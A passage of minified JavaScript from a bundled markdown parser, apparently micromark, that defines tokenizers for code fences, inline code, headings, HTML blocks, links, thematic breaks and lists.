XS(e,t,r){const a=this,o={partial:!0,tokenize:de};let s=0,l=0,h;return p;function p(z){return g(z)}function g(z){const me=a.events[a.events.length-1];return s=me&&me[1].type==="linePrefix"?me[2].sliceSerialize(me[1],!0).length:0,h=z,e.enter("codeFenced"),e.enter("codeFencedFence"),e.enter("codeFencedFenceSequence"),T(z)}function T(z){return z===h?(l++,e.consume(z),T):l<3?r(z):(e.exit("codeFencedFenceSequence"),we(z)?De(e,E,"whitespace")(z):E(z))}function E(z){return z===null||Te(z)?(e.exit("codeFencedFence"),a.interrupt?t(z):e.check(ch,F,ie)(z)):(e.enter("codeFencedFenceInfo"),e.enter("chunkString",{contentType:"string"}),_(z))}function _(z){return z===null||Te(z)?(e.exit("chunkString"),e.exit("codeFencedFenceInfo"),E(z)):we(z)?(e.exit("chunkString"),e.exit("codeFencedFenceInfo"),De(e,S,"whitespace")(z)):z===96&&z===h?r(z):(e.consume(z),_)}function S(z){return z===null||Te(z)?E(z):(e.enter("codeFencedFenceMeta"),e.enter("chunkString",{contentType:"string"}),I(z))}function I(z){return z===null||Te(z)?(e.exit("chunkString"),e.exit("codeFencedFenceMeta"),E(z)):z===96&&z===h?r(z):(e.consume(z),I)}function F(z){return e.attempt(o,ie,P)(z)}function P(z){return e.enter("lineEnding"),e.consume(z),e.exit("lineEnding"),w}function w(z){return s>0&&we(z)?De(e,Q,"linePrefix",s+1)(z):Q(z)}function Q(z){return z===null||Te(z)?e.check(ch,F,ie)(z):(e.enter("codeFlowValue"),j(z))}function j(z){return z===null||Te(z)?(e.exit("codeFlowValue"),Q(z)):(e.consume(z),j)}function ie(z){return e.exit("codeFenced"),t(z)}function de(z,me,Se){let xe=0;return H;function H(re){return z.enter("lineEnding"),z.consume(re),z.exit("lineEnding"),ue}function ue(re){return z.enter("codeFencedFence"),we(re)?De(z,oe,"linePrefix",a.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(re):oe(re)}function oe(re){return re===h?(z.enter("codeFencedFenceSequence"),Ae(re)):Se(re)}function Ae(re){return re===h?(xe++,z.consume(re),Ae):xe>=l?(z.exit("codeFencedFenceSequence"),we(re)?De(z,ce,"whitespace")(re):ce(re)):Se(re)}function ce(re){return re===null||Te(re)?(z.exit("codeFencedFence"),me(re)):Se(re)}}}function GS(e,t,r){const a=this;return o;function o(l){return l===null?r(l):(e.enter("lineEnding"),e.consume(l),e.exit("lineEnding"),s)}function s(l){return a.parser.lazy[a.now().line]?r(l):t(l)}}const wl={name:"codeIndented",tokenize:$S},VS={partial:!0,tokenize:qS};function $S(e,t,r){const a=this;return o;function o(g){return e.enter("codeIndented"),De(e,s,"linePrefix",5)(g)}function s(g){const T=a.events[a.events.length-1];return T&&T[1].type==="linePrefix"&&T[2].sliceSerialize(T[1],!0).length>=4?l(g):r(g)}function l(g){return g===null?p(g):Te(g)?e.attempt(VS,l,p)(g):(e.enter("codeFlowValue"),h(g))}function h(g){return g===null||Te(g)?(e.exit("codeFlowValue"),l(g)):(e.consume(g),h)}function p(g){return e.exit("codeIndented"),t(g)}}function qS(e,t,r){const a=this;return o;function o(l){return a.parser.lazy[a.now().line]?r(l):Te(l)?(e.enter("lineEnding"),e.consume(l),e.exit("lineEnding"),o):De(e,s,"linePrefix",5)(l)}function s(l){const h=a.events[a.events.length-1];return h&&h[1].type==="linePrefix"&&h[2].sliceSerialize(h[1],!0).length>=4?t(l):Te(l)?o(l):r(l)}}const KS={name:"codeText",previous:ZS,resolve:JS,tokenize:ey};function JS(e){let t=e.length-4,r=3,a,o;if((e[r][1].type==="lineEnding"||e[r][1].type==="space")&&(e[t][1].type==="lineEnding"||e[t][1].type==="space")){for(a=r;++a<t;)if(e[a][1].type==="codeTextData"){e[r][1].type="codeTextPadding",e[t][1].type="codeTextPadding",r+=2,t-=2;break}}for(a=r-1,t++;++a<=t;)o===void 0?a!==t&&e[a][1].type!=="lineEnding"&&(o=a):(a===t||e[a][1].type==="lineEnding")&&(e[o][1].type="codeTextData",a!==o+2&&(e[o][1].end=e[a-1][1].end,e.splice(o+2,a-o-2),t-=a-o-2,a=o+2),o=void 0);return e}function ZS(e){return e!==96||this.events[this.events.length-1][1].type==="characterEscape"}function ey(e,t,r){let a=0,o,s;return l;function l(E){return e.enter("codeText"),e.enter("codeTextSequence"),h(E)}function h(E){return E===96?(e.consume(E),a++,h):(e.exit("codeTextSequence"),p(E))}function p(E){return E===null?r(E):E===32?(e.enter("space"),e.consume(E),e.exit("space"),p):E===96?(s=e.enter("codeTextSequence"),o=0,T(E)):Te(E)?(e.enter("lineEnding"),e.consume(E),e.exit("lineEnding"),p):(e.enter("codeTextData"),g(E))}function g(E){return E===null||E===32||E===96||Te(E)?(e.exit("codeTextData"),p(E)):(e.consume(E),g)}function T(E){return E===96?(e.consume(E),o++,T):o===a?(e.exit("codeTextSequence"),e.exit("codeText"),t(E)):(s.type="codeTextData",g(E))}}class ty{constructor(t){this.left=t?[...t]:[],this.right=[]}get(t){if(t<0||t>=this.left.length+this.right.length)throw new RangeError("Cannot access index `"+t+"` in a splice buffer of size `"+(this.left.length+this.right.length)+"`");return t<this.left.length?this.left[t]:this.right[this.right.length-t+this.left.length-1]}get length(){return this.left.length+this.right.length}shift(){return this.setCursor(0),this.right.pop()}slice(t,r){const a=r??Number.POSITIVE_INFINITY;return a<this.left.length?this.left.slice(t,a):t>this.left.length?this.right.slice(this.right.length-a+this.left.length,this.right.length-t+this.left.length).reverse():this.left.slice(t).concat(this.right.slice(this.right.length-a+this.left.length).reverse())}splice(t,r,a){const o=r||0;this.setCursor(Math.trunc(t));const s=this.right.splice(this.right.length-o,Number.POSITIVE_INFINITY);return a&&pa(this.left,a),s.reverse()}pop(){return this.setCursor(Number.POSITIVE_INFINITY),this.left.pop()}push(t){this.setCursor(Number.POSITIVE_INFINITY),this.left.push(t)}pushMany(t){this.setCursor(Number.POSITIVE_INFINITY),pa(this.left,t)}unshift(t){this.setCursor(0),this.right.push(t)}unshiftMany(t){this.setCursor(0),pa(this.right,t.reverse())}setCursor(t){if(!(t===this.left.length||t>this.left.length&&this.right.length===0||t<0&&this.left.length===0))if(t<this.left.length){const r=this.left.splice(t,Number.POSITIVE_INFINITY);pa(this.right,r.reverse())}else{const r=this.right.splice(this.left.length+this.right.length-t,Number.POSITIVE_INFINITY);pa(this.left,r.reverse())}}}function pa(e,t){let r=0;if(t.length<1e4)e.push(...t);else for(;r<t.length;)e.push(...t.slice(r,r+1e4)),r+=1e4}function Yp(e){const t={};let r=-1,a,o,s,l,h,p,g;const T=new ty(e);for(;++r<T.length;){for(;r in t;)r=t[r];if(a=T.get(r),r&&a[1].type==="chunkFlow"&&T.get(r-1)[1].type==="listItemPrefix"&&(p=a[1]._tokenizer.events,s=0,s<p.length&&p[s][1].type==="lineEndingBlank"&&(s+=2),s<p.length&&p[s][1].type==="content"))for(;++s<p.length&&p[s][1].type!=="content";)p[s][1].type==="chunkText"&&(p[s][1]._isInFirstContentOfListItem=!0,s++);if(a[0]==="enter")a[1].contentType&&(Object.assign(t,ny(T,r)),r=t[r],g=!0);else if(a[1]._container){for(s=r,o=void 0;s--;)if(l=T.get(s),l[1].type==="lineEnding"||l[1].type==="lineEndingBlank")l[0]==="enter"&&(o&&(T.get(o)[1].type="lineEndingBlank"),l[1].type="lineEnding",o=s);else if(!(l[1].type==="linePrefix"||l[1].type==="listItemIndent"))break;o&&(a[1].end={...T.get(o)[1].start},h=T.slice(o,r),h.unshift(a),T.splice(o,r-o+1,h))}}return Wt(e,0,Number.POSITIVE_INFINITY,T.slice(0)),!g}function ny(e,t){const r=e.get(t)[1],a=e.get(t)[2];let o=t-1;const s=[];let l=r._tokenizer;l||(l=a.parser[r.contentType](r.start),r._contentTypeTextTrailing&&(l._contentTypeTextTrailing=!0));const h=l.events,p=[],g={};let T,E,_=-1,S=r,I=0,F=0;const P=[F];for(;S;){for(;e.get(++o)[1]!==S;);s.push(o),S._tokenizer||(T=a.sliceStream(S),S.next||T.push(null),E&&l.defineSkip(S.start),S._isInFirstContentOfListItem&&(l._gfmTasklistFirstContentOfListItem=!0),l.write(T),S._isInFirstContentOfListItem&&(l._gfmTasklistFirstContentOfListItem=void 0)),E=S,S=S.next}for(S=r;++_<h.length;)h[_][0]==="exit"&&h[_-1][0]==="enter"&&h[_][1].type===h[_-1][1].type&&h[_][1].start.line!==h[_][1].end.line&&(F=_+1,P.push(F),S._tokenizer=void 0,S.previous=void 0,S=S.next);for(l.events=[],S?(S._tokenizer=void 0,S.previous=void 0):P.pop(),_=P.length;_--;){const w=h.slice(P[_],P[_+1]),Q=s.pop();p.push([Q,Q+w.length-1]),e.splice(Q,2,w)}for(p.reverse(),_=-1;++_<p.length;)g[I+p[_][0]]=I+p[_][1],I+=p[_][1]-p[_][0]-1;return g}const ry={resolve:ay,tokenize:uy},iy={partial:!0,tokenize:oy};function ay(e){return Yp(e),e}function uy(e,t){let r;return a;function a(h){return e.enter("content"),r=e.enter("chunkContent",{contentType:"content"}),o(h)}function o(h){return h===null?s(h):Te(h)?e.check(iy,l,s)(h):(e.consume(h),o)}function s(h){return e.exit("chunkContent"),e.exit("content"),t(h)}function l(h){return e.consume(h),e.exit("chunkContent"),r.next=e.enter("chunkContent",{contentType:"content",previous:r}),r=r.next,o}}function oy(e,t,r){const a=this;return o;function o(l){return e.exit("chunkContent"),e.enter("lineEnding"),e.consume(l),e.exit("lineEnding"),De(e,s,"linePrefix")}function s(l){if(l===null||Te(l))return r(l);const h=a.events[a.events.length-1];return!a.parser.constructs.disable.null.includes("codeIndented")&&h&&h[1].type==="linePrefix"&&h[2].sliceSerialize(h[1],!0).length>=4?t(l):e.interrupt(a.parser.constructs.flow,r,t)(l)}}function Xp(e,t,r,a,o,s,l,h,p){const g=p||Number.POSITIVE_INFINITY;let T=0;return E;function E(w){return w===60?(e.enter(a),e.enter(o),e.enter(s),e.consume(w),e.exit(s),_):w===null||w===32||w===41||go(w)?r(w):(e.enter(a),e.enter(l),e.enter(h),e.enter("chunkString",{contentType:"string"}),F(w))}function _(w){return w===62?(e.enter(s),e.consume(w),e.exit(s),e.exit(o),e.exit(a),t):(e.enter(h),e.enter("chunkString",{contentType:"string"}),S(w))}function S(w){return w===62?(e.exit("chunkString"),e.exit(h),_(w)):w===null||w===60||Te(w)?r(w):(e.consume(w),w===92?I:S)}function I(w){return w===60||w===62||w===92?(e.consume(w),S):S(w)}function F(w){return!T&&(w===null||w===41||We(w))?(e.exit("chunkString"),e.exit(h),e.exit(l),e.exit(a),t(w)):T<g&&w===40?(e.consume(w),T++,F):w===41?(e.consume(w),T--,F):w===null||w===32||w===40||go(w)?r(w):(e.consume(w),w===92?P:F)}function P(w){return w===40||w===41||w===92?(e.consume(w),F):F(w)}}function Gp(e,t,r,a,o,s){const l=this;let h=0,p;return g;function g(S){return e.enter(a),e.enter(o),e.consume(S),e.exit(o),e.enter(s),T}function T(S){return h>999||S===null||S===91||S===93&&!p||S===94&&!h&&"_hiddenFootnoteSupport"in l.parser.constructs?r(S):S===93?(e.exit(s),e.enter(o),e.consume(S),e.exit(o),e.exit(a),t):Te(S)?(e.enter("lineEnding"),e.consume(S),e.exit("lineEnding"),T):(e.enter("chunkString",{contentType:"string"}),E(S))}function E(S){return S===null||S===91||S===93||Te(S)||h++>999?(e.exit("chunkString"),T(S)):(e.consume(S),p||(p=!we(S)),S===92?_:E)}function _(S){return S===91||S===92||S===93?(e.consume(S),h++,E):E(S)}}function Vp(e,t,r,a,o,s){let l;return h;function h(_){return _===34||_===39||_===40?(e.enter(a),e.enter(o),e.consume(_),e.exit(o),l=_===40?41:_,p):r(_)}function p(_){return _===l?(e.enter(o),e.consume(_),e.exit(o),e.exit(a),t):(e.enter(s),g(_))}function g(_){return _===l?(e.exit(s),p(l)):_===null?r(_):Te(_)?(e.enter("lineEnding"),e.consume(_),e.exit("lineEnding"),De(e,g,"linePrefix")):(e.enter("chunkString",{contentType:"string"}),T(_))}function T(_){return _===l||_===null||Te(_)?(e.exit("chunkString"),g(_)):(e.consume(_),_===92?E:T)}function E(_){return _===l||_===92?(e.consume(_),T):T(_)}}function Sa(e,t){let r;return a;function a(o){return Te(o)?(e.enter("lineEnding"),e.consume(o),e.exit("lineEnding"),r=!0,a):we(o)?De(e,a,r?"linePrefix":"lineSuffix")(o):t(o)}}const sy={name:"definition",tokenize:cy},ly={partial:!0,tokenize:dy};function cy(e,t,r){const a=this;let o;return s;function s(S){return e.enter("definition"),l(S)}function l(S){return Gp.call(a,e,h,r,"definitionLabel","definitionLabelMarker","definitionLabelString")(S)}function h(S){return o=sn(a.sliceSerialize(a.events[a.events.length-1][1]).slice(1,-1)),S===58?(e.enter("definitionMarker"),e.consume(S),e.exit("definitionMarker"),p):r(S)}function p(S){return We(S)?Sa(e,g)(S):g(S)}function g(S){return Xp(e,T,r,"definitionDestination","definitionDestinationLiteral","definitionDestinationLiteralMarker","definitionDestinationRaw","definitionDestinationString")(S)}function T(S){return e.attempt(ly,E,E)(S)}function E(S){return we(S)?De(e,_,"whitespace")(S):_(S)}function _(S){return S===null||Te(S)?(e.exit("definition"),a.parser.defined.push(o),t(S)):r(S)}}function dy(e,t,r){return a;function a(h){return We(h)?Sa(e,o)(h):r(h)}function o(h){return Vp(e,s,r,"definitionTitle","definitionTitleMarker","definitionTitleString")(h)}function s(h){return we(h)?De(e,l,"whitespace")(h):l(h)}function l(h){return h===null||Te(h)?t(h):r(h)}}const fy={name:"hardBreakEscape",tokenize:hy};function hy(e,t,r){return a;function a(s){return e.enter("hardBreakEscape"),e.consume(s),o}function o(s){return Te(s)?(e.exit("hardBreakEscape"),t(s)):r(s)}}const py={name:"headingAtx",resolve:my,tokenize:gy};function my(e,t){let r=e.length-2,a=3,o,s;return e[a][1].type==="whitespace"&&(a+=2),r-2>a&&e[r][1].type==="whitespace"&&(r-=2),e[r][1].type==="atxHeadingSequence"&&(a===r-1||r-4>a&&e[r-2][1].type==="whitespace")&&(r-=a+1===r?2:4),r>a&&(o={type:"atxHeadingText",start:e[a][1].start,end:e[r][1].end},s={type:"chunkText",start:e[a][1].start,end:e[r][1].end,contentType:"text"},Wt(e,a,r-a+1,[["enter",o,t],["enter",s,t],["exit",s,t],["exit",o,t]])),e}function gy(e,t,r){let a=0;return o;function o(T){return e.enter("atxHeading"),s(T)}function s(T){return e.enter("atxHeadingSequence"),l(T)}function l(T){return T===35&&a++<6?(e.consume(T),l):T===null||We(T)?(e.exit("atxHeadingSequence"),h(T)):r(T)}function h(T){return T===35?(e.enter("atxHeadingSequence"),p(T)):T===null||Te(T)?(e.exit("atxHeading"),t(T)):we(T)?De(e,h,"whitespace")(T):(e.enter("atxHeadingText"),g(T))}function p(T){return T===35?(e.consume(T),p):(e.exit("atxHeadingSequence"),h(T))}function g(T){return T===null||T===35||We(T)?(e.exit("atxHeadingText"),h(T)):(e.consume(T),g)}}const Ey=["address","article","aside","base","basefont","blockquote","body","caption","center","col","colgroup","dd","details","dialog","dir","div","dl","dt","fieldset","figcaption","figure","footer","form","frame","frameset","h1","h2","h3","h4","h5","h6","head","header","hr","html","iframe","legend","li","link","main","menu","menuitem","nav","noframes","ol","optgroup","option","p","param","search","section","summary","table","tbody","td","tfoot","th","thead","title","tr","track","ul"],fh=["pre","script","style","textarea"],Ty={concrete:!0,name:"htmlFlow",resolveTo:Sy,tokenize:yy},by={partial:!0,tokenize:xy},_y={partial:!0,tokenize:Cy};function Sy(e){let t=e.length;for(;t--&&!(e[t][0]==="enter"&&e[t][1].type==="htmlFlow"););return t>1&&e[t-2][1].type==="linePrefix"&&(e[t][1].start=e[t-2][1].start,e[t+1][1].start=e[t-2][1].start,e.splice(t-2,2)),e}function yy(e,t,r){const a=this;let o,s,l,h,p;return g;function g(L){return T(L)}function T(L){return e.enter("htmlFlow"),e.enter("htmlFlowData"),e.consume(L),E}function E(L){return L===33?(e.consume(L),_):L===47?(e.consume(L),s=!0,F):L===63?(e.consume(L),o=3,a.interrupt?t:C):Lt(L)?(e.consume(L),l=String.fromCharCode(L),P):r(L)}function _(L){return L===45?(e.consume(L),o=2,S):L===91?(e.consume(L),o=5,h=0,I):Lt(L)?(e.consume(L),o=4,a.interrupt?t:C):r(L)}function S(L){return L===45?(e.consume(L),a.interrupt?t:C):r(L)}function I(L){const _e="CDATA[";return L===_e.charCodeAt(h++)?(e.consume(L),h===_e.length?a.interrupt?t:oe:I):r(L)}function F(L){return Lt(L)?(e.consume(L),l=String.fromCharCode(L),P):r(L)}function P(L){if(L===null||L===47||L===62||We(L)){const _e=L===47,Ne=l.toLowerCase();return!_e&&!s&&fh.includes(Ne)?(o=1,a.interrupt?t(L):oe(L)):Ey.includes(l.toLowerCase())?(o=6,_e?(e.consume(L),w):a.interrupt?t(L):oe(L)):(o=7,a.interrupt&&!a.parser.lazy[a.now().line]?r(L):s?Q(L):j(L))}return L===45||St(L)?(e.consume(L),l+=String.fromCharCode(L),P):r(L)}function w(L){return L===62?(e.consume(L),a.interrupt?t:oe):r(L)}function Q(L){return we(L)?(e.consume(L),Q):H(L)}function j(L){return L===47?(e.consume(L),H):L===58||L===95||Lt(L)?(e.consume(L),ie):we(L)?(e.consume(L),j):H(L)}function ie(L){return L===45||L===46||L===58||L===95||St(L)?(e.consume(L),ie):de(L)}function de(L){return L===61?(e.consume(L),z):we(L)?(e.consume(L),de):j(L)}function z(L){return L===null||L===60||L===61||L===62||L===96?r(L):L===34||L===39?(e.consume(L),p=L,me):we(L)?(e.consume(L),z):Se(L)}function me(L){return L===p?(e.consume(L),p=null,xe):L===null||Te(L)?r(L):(e.consume(L),me)}function Se(L){return L===null||L===34||L===39||L===47||L===60||L===61||L===62||L===96||We(L)?de(L):(e.consume(L),Se)}function xe(L){return L===47||L===62||we(L)?j(L):r(L)}function H(L){return L===62?(e.consume(L),ue):r(L)}function ue(L){return L===null||Te(L)?oe(L):we(L)?(e.consume(L),ue):r(L)}function oe(L){return L===45&&o===2?(e.consume(L),Le):L===60&&o===1?(e.consume(L),ke):L===62&&o===4?(e.consume(L),O):L===63&&o===3?(e.consume(L),C):L===93&&o===5?(e.consume(L),pe):Te(L)&&(o===6||o===7)?(e.exit("htmlFlowData"),e.check(by,X,Ae)(L)):L===null||Te(L)?(e.exit("htmlFlowData"),Ae(L)):(e.consume(L),oe)}function Ae(L){return e.check(_y,ce,X)(L)}function ce(L){return e.enter("lineEnding"),e.consume(L),e.exit("lineEnding"),re}function re(L){return L===null||Te(L)?Ae(L):(e.enter("htmlFlowData"),oe(L))}function Le(L){return L===45?(e.consume(L),C):oe(L)}function ke(L){return L===47?(e.consume(L),l="",ee):oe(L)}function ee(L){if(L===62){const _e=l.toLowerCase();return fh.includes(_e)?(e.consume(L),O):oe(L)}return Lt(L)&&l.length<8?(e.consume(L),l+=String.fromCharCode(L),ee):oe(L)}function pe(L){return L===93?(e.consume(L),C):oe(L)}function C(L){return L===62?(e.consume(L),O):L===45&&o===2?(e.consume(L),C):oe(L)}function O(L){return L===null||Te(L)?(e.exit("htmlFlowData"),X(L)):(e.consume(L),O)}function X(L){return e.exit("htmlFlow"),t(L)}}function Cy(e,t,r){const a=this;return o;function o(l){return Te(l)?(e.enter("lineEnding"),e.consume(l),e.exit("lineEnding"),s):r(l)}function s(l){return a.parser.lazy[a.now().line]?r(l):t(l)}}function xy(e,t,r){return a;function a(o){return e.enter("lineEnding"),e.consume(o),e.exit("lineEnding"),e.attempt(Ha,t,r)}}const Ay={name:"htmlText",tokenize:Ly};function Ly(e,t,r){const a=this;let o,s,l;return h;function h(C){return e.enter("htmlText"),e.enter("htmlTextData"),e.consume(C),p}function p(C){return C===33?(e.consume(C),g):C===47?(e.consume(C),de):C===63?(e.consume(C),j):Lt(C)?(e.consume(C),Se):r(C)}function g(C){return C===45?(e.consume(C),T):C===91?(e.consume(C),s=0,I):Lt(C)?(e.consume(C),Q):r(C)}function T(C){return C===45?(e.consume(C),S):r(C)}function E(C){return C===null?r(C):C===45?(e.consume(C),_):Te(C)?(l=E,ke(C)):(e.consume(C),E)}function _(C){return C===45?(e.consume(C),S):E(C)}function S(C){return C===62?Le(C):C===45?_(C):E(C)}function I(C){const O="CDATA[";return C===O.charCodeAt(s++)?(e.consume(C),s===O.length?F:I):r(C)}function F(C){return C===null?r(C):C===93?(e.consume(C),P):Te(C)?(l=F,ke(C)):(e.consume(C),F)}function P(C){return C===93?(e.consume(C),w):F(C)}function w(C){return C===62?Le(C):C===93?(e.consume(C),w):F(C)}function Q(C){return C===null||C===62?Le(C):Te(C)?(l=Q,ke(C)):(e.consume(C),Q)}function j(C){return C===null?r(C):C===63?(e.consume(C),ie):Te(C)?(l=j,ke(C)):(e.consume(C),j)}function ie(C){return C===62?Le(C):j(C)}function de(C){return Lt(C)?(e.consume(C),z):r(C)}function z(C){return C===45||St(C)?(e.consume(C),z):me(C)}function me(C){return Te(C)?(l=me,ke(C)):we(C)?(e.consume(C),me):Le(C)}function Se(C){return C===45||St(C)?(e.consume(C),Se):C===47||C===62||We(C)?xe(C):r(C)}function xe(C){return C===47?(e.consume(C),Le):C===58||C===95||Lt(C)?(e.consume(C),H):Te(C)?(l=xe,ke(C)):we(C)?(e.consume(C),xe):Le(C)}function H(C){return C===45||C===46||C===58||C===95||St(C)?(e.consume(C),H):ue(C)}function ue(C){return C===61?(e.consume(C),oe):Te(C)?(l=ue,ke(C)):we(C)?(e.consume(C),ue):xe(C)}function oe(C){return C===null||C===60||C===61||C===62||C===96?r(C):C===34||C===39?(e.consume(C),o=C,Ae):Te(C)?(l=oe,ke(C)):we(C)?(e.consume(C),oe):(e.consume(C),ce)}function Ae(C){return C===o?(e.consume(C),o=void 0,re):C===null?r(C):Te(C)?(l=Ae,ke(C)):(e.consume(C),Ae)}function ce(C){return C===null||C===34||C===39||C===60||C===61||C===96?r(C):C===47||C===62||We(C)?xe(C):(e.consume(C),ce)}function re(C){return C===47||C===62||We(C)?xe(C):r(C)}function Le(C){return C===62?(e.consume(C),e.exit("htmlTextData"),e.exit("htmlText"),t):r(C)}function ke(C){return e.exit("htmlTextData"),e.enter("lineEnding"),e.consume(C),e.exit("lineEnding"),ee}function ee(C){return we(C)?De(e,pe,"linePrefix",a.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(C):pe(C)}function pe(C){return e.enter("htmlTextData"),l(C)}}const Ac={name:"labelEnd",resolveAll:vy,resolveTo:Ry,tokenize:Oy},ky={tokenize:Py},Iy={tokenize:wy},Ny={tokenize:Dy};function vy(e){let t=-1;const r=[];for(;++t<e.length;){const a=e[t][1];if(r.push(e[t]),a.type==="labelImage"||a.type==="labelLink"||a.type==="labelEnd"){const o=a.type==="labelImage"?4:2;a.type="data",t+=o}}return e.length!==r.length&&Wt(e,0,e.length,r),e}function Ry(e,t){let r=e.length,a=0,o,s,l,h;for(;r--;)if(o=e[r][1],s){if(o.type==="link"||o.type==="labelLink"&&o._inactive)break;e[r][0]==="enter"&&o.type==="labelLink"&&(o._inactive=!0)}else if(l){if(e[r][0]==="enter"&&(o.type==="labelImage"||o.type==="labelLink")&&!o._balanced&&(s=r,o.type!=="labelLink")){a=2;break}}else o.type==="labelEnd"&&(l=r);const p={type:e[s][1].type==="labelLink"?"link":"image",start:{...e[s][1].start},end:{...e[e.length-1][1].end}},g={type:"label",start:{...e[s][1].start},end:{...e[l][1].end}},T={type:"labelText",start:{...e[s+a+2][1].end},end:{...e[l-2][1].start}};return h=[["enter",p,t],["enter",g,t]],h=qt(h,e.slice(s+1,s+a+3)),h=qt(h,[["enter",T,t]]),h=qt(h,vo(t.parser.constructs.insideSpan.null,e.slice(s+a+4,l-3),t)),h=qt(h,[["exit",T,t],e[l-2],e[l-1],["exit",g,t]]),h=qt(h,e.slice(l+1)),h=qt(h,[["exit",p,t]]),Wt(e,s,e.length,h),e}function Oy(e,t,r){const a=this;let o=a.events.length,s,l;for(;o--;)if((a.events[o][1].type==="labelImage"||a.events[o][1].type==="labelLink")&&!a.events[o][1]._balanced){s=a.events[o][1];break}return h;function h(_){return s?s._inactive?E(_):(l=a.parser.defined.includes(sn(a.sliceSerialize({start:s.end,end:a.now()}))),e.enter("labelEnd"),e.enter("labelMarker"),e.consume(_),e.exit("labelMarker"),e.exit("labelEnd"),p):r(_)}function p(_){return _===40?e.attempt(ky,T,l?T:E)(_):_===91?e.attempt(Iy,T,l?g:E)(_):l?T(_):E(_)}function g(_){return e.attempt(Ny,T,E)(_)}function T(_){return t(_)}function E(_){return s._balanced=!0,r(_)}}function Py(e,t,r){return a;function a(E){return e.enter("resource"),e.enter("resourceMarker"),e.consume(E),e.exit("resourceMarker"),o}function o(E){return We(E)?Sa(e,s)(E):s(E)}function s(E){return E===41?T(E):Xp(e,l,h,"resourceDestination","resourceDestinationLiteral","resourceDestinationLiteralMarker","resourceDestinationRaw","resourceDestinationString",32)(E)}function l(E){return We(E)?Sa(e,p)(E):T(E)}function h(E){return r(E)}function p(E){return E===34||E===39||E===40?Vp(e,g,r,"resourceTitle","resourceTitleMarker","resourceTitleString")(E):T(E)}function g(E){return We(E)?Sa(e,T)(E):T(E)}function T(E){return E===41?(e.enter("resourceMarker"),e.consume(E),e.exit("resourceMarker"),e.exit("resource"),t):r(E)}}function wy(e,t,r){const a=this;return o;function o(h){return Gp.call(a,e,s,l,"reference","referenceMarker","referenceString")(h)}function s(h){return a.parser.defined.includes(sn(a.sliceSerialize(a.events[a.events.length-1][1]).slice(1,-1)))?t(h):r(h)}function l(h){return r(h)}}function Dy(e,t,r){return a;function a(s){return e.enter("reference"),e.enter("referenceMarker"),e.consume(s),e.exit("referenceMarker"),o}function o(s){return s===93?(e.enter("referenceMarker"),e.consume(s),e.exit("referenceMarker"),e.exit("reference"),t):r(s)}}const My={name:"labelStartImage",resolveAll:Ac.resolveAll,tokenize:Fy};function Fy(e,t,r){const a=this;return o;function o(h){return e.enter("labelImage"),e.enter("labelImageMarker"),e.consume(h),e.exit("labelImageMarker"),s}function s(h){return h===91?(e.enter("labelMarker"),e.consume(h),e.exit("labelMarker"),e.exit("labelImage"),l):r(h)}function l(h){return h===94&&"_hiddenFootnoteSupport"in a.parser.constructs?r(h):t(h)}}const By={name:"labelStartLink",resolveAll:Ac.resolveAll,tokenize:Hy};function Hy(e,t,r){const a=this;return o;function o(l){return e.enter("labelLink"),e.enter("labelMarker"),e.consume(l),e.exit("labelMarker"),e.exit("labelLink"),s}function s(l){return l===94&&"_hiddenFootnoteSupport"in a.parser.constructs?r(l):t(l)}}const Dl={name:"lineEnding",tokenize:Uy};function Uy(e,t){return r;function r(a){return e.enter("lineEnding"),e.consume(a),e.exit("lineEnding"),De(e,t,"linePrefix")}}const co={name:"thematicBreak",tokenize:zy};function zy(e,t,r){let a=0,o;return s;function s(g){return e.enter("thematicBreak"),l(g)}function l(g){return o=g,h(g)}function h(g){return g===o?(e.enter("thematicBreakSequence"),p(g)):a>=3&&(g===null||Te(g))?(e.exit("thematicBreak"),t(g)):r(g)}function p(g){return g===o?(e.consume(g),a++,p):(e.exit("thematicBreakSequence"),we(g)?De(e,h,"whitespace")(g):h(g))}}const wt={continuation:{tokenize:Yy},exit:Gy,name:"list",tokenize:Qy},Wy={partial:!0,tokenize:Vy},jy={partial:!0,tokenize:Xy};function Qy(e,t,r){const a=this,o=a.events[a.events.length-1];let s=o&&o[1].type==="linePrefix"?o[2].sliceSerialize(o[1],!0).length:0,l=0;return h;function h(S){const I=a.containerState.type||(S===42||S===43||S===45?"listUnordered":"listOrdered");if(I==="listUnordered"?!a.containerState.marker||S===a.containerState.marker:uc(S)){if(a.containerState.type||(a.containerState.type=I,e.enter(I,{_container:!0})),I==="listUnordered")return e.enter("listItemPrefix"),S===42||S===45?e.check(co,r,g)(S):g(S);if(!a.interrupt||S===49)return e.enter("listItemPrefix"),e.enter("listItemValue"),p(S)}return r(S)}function p(S){return uc(S)&&++l<10?(e.consume(S),p):(!a.interrupt||l<2)&&(a.containerState.marker?S===a.containerState.marker:S===41||S===46)?(e.exit("listItemValue"),g(S)):r(S)}function g(S){return e.enter("listItemMarker"),e.consume(S),e.exit("listItemMarker"),a.containerState.marker=a.containerState.marker||S,e.check(Ha,a.interrupt?r:T,e.attempt(Wy,_,E))}function T(S){return a.containerState.initialBlankLine=!0,s++,_(S)}function E(S){return we(S)?(e.enter("listItemPrefixWhitespace"),e.consume(S),e.exit("listItemPrefixWhitespace"),_):r(S)}function _(S){return a.containerState.size=s+a.sliceSerialize(e.exit("listItemPrefix"),!0).length,t(S)}}function Yy(e,t,r){const a=this;return a.containerState._closeFlow=void 0,e.check(Ha,o,s);function o(h){return a.containerState.furtherBlankLines=a.containerState.furtherBlankLines||a.containerState.initialBlankLine,De(e,t,"listItemIndent",a.containerState.size+1)(h)}function s(h){return a.containerState.furtherBlankLines||!we(h)?(a.containerState.furtherBlankLines=void 0,a.containerState.initialBlankLine=void 0,l(h)):(a.containerState.furtherBlankLines=void 0,a.containerState.initialBlankLine=void 0,e.attempt(jy,t,l)(h))}function l(h){return a.containerState._closeFlow=!0,a.interrupt=void 0,De(e,e.attempt(wt,t,r),"linePrefix",a.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(h)}}function Xy(e,t,r){const a=this;return De(e,o,"listItemIndent",a.containerState.size+1);function o(s){const l=a.events[a.events.length-1];return l&&l[1].type==="listItemIndent"&&l[2].sliceSerialize(l[1],!0).length===a.containerState.size?t(s):r(s)}}function Gy(e){e.exit(this.containerState.type)}function Vy(e,t,r){const a=this;return De(e,o,"listItemPrefixWhitespace",a.parser.constructs.disable.null.includes("codeIndented")?void 0:5);function o(s){const l=a.events[a.events.length-1];return!we(s)&&l&&l[1].type==="listItemPrefixWhitespace"?t(s):r(s)}}const 